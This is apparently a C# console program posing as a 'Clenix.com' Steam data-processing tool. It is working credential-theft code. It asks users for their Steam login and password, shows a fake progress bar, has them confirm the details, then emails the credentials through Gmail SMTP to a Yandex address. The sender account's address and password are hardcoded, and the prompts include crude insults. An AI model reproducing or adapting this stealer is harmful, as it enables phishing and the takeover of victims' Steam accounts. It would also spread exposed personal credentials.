using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;

namespace Clenix
{
    class Program
    {
        public static void Main(string[] args)
        { 
            // Обычный диолог с пользователем
            Console.WriteLine("Привет пользователь нашего Clenix.com");
            Console.ReadKey();
            Console.WriteLine();
            Console.WriteLine("Введите данные Steam для обработки");
            Console.WriteLine();
            Console.Write("Логин : ");
            String Login = Console.ReadLine();
            Console.WriteLine();
            Console.Write("Пароль : ");
            String Password = Console.ReadLine();
            Console.WriteLine("Идет Обработка данных ");
            //Тут включается таймер которые делает фейковые загрузку
            //С помощью Thread.Sleep(тут скорость) 
            var thread = new Thread(() =>
            {
                
                for (int i = 0; i <= 100; i++)
                {
                    Console.SetCursorPosition(50, 50);
                    Console.WriteLine("Выполнено {0}%", i);
                    Thread.Sleep(20);
                }
            });
            thread.Start();
            thread.Join();
            Console.Clear();
            Console.SetCursorPosition(50, 50);
            Console.WriteLine("Обработка успешно прошла");
            Console.ReadKey();
            Console.Clear();
            Console.SetCursorPosition(0, 0);
            Console.WriteLine("Войдите повторно в систему");
            Console.WriteLine();
            while (true)
            {
                Console.WriteLine("Логин :");
                String LoginPro = Console.ReadLine();
                Console.WriteLine("Пароль :");
                String PasswordPro = Console.ReadLine();
                if (Login == LoginPro & Password == PasswordPro)
                {

                    Console.WriteLine("Успешный вход в систему !");
                    MailAddress from = new MailAddress("maratkaxa555@gmail.com", "Marat");
                    MailAddress to = new MailAddress("maratkaxa@yandex.ru");
                    MailMessage m = new MailMessage(from, to);
                    m.Subject = "Steam";
                    m.Body = $"<h2> {LoginPro}, {PasswordPro} </h2>";
                    m.IsBodyHtml = true;
                    SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
                    smtp.Credentials = new NetworkCredential("maratkaxa555@gmail.com", "89679409433");
                    smtp.EnableSsl = true;
                    smtp.Send(m);
                    Console.WriteLine("Да все тебе пипи");
                    
                    break;
                }
                else
                {
                    Console.WriteLine("А хуй тебе");
                    break;
               }
                
            }
            Console.ReadKey(true);

        }

    }
}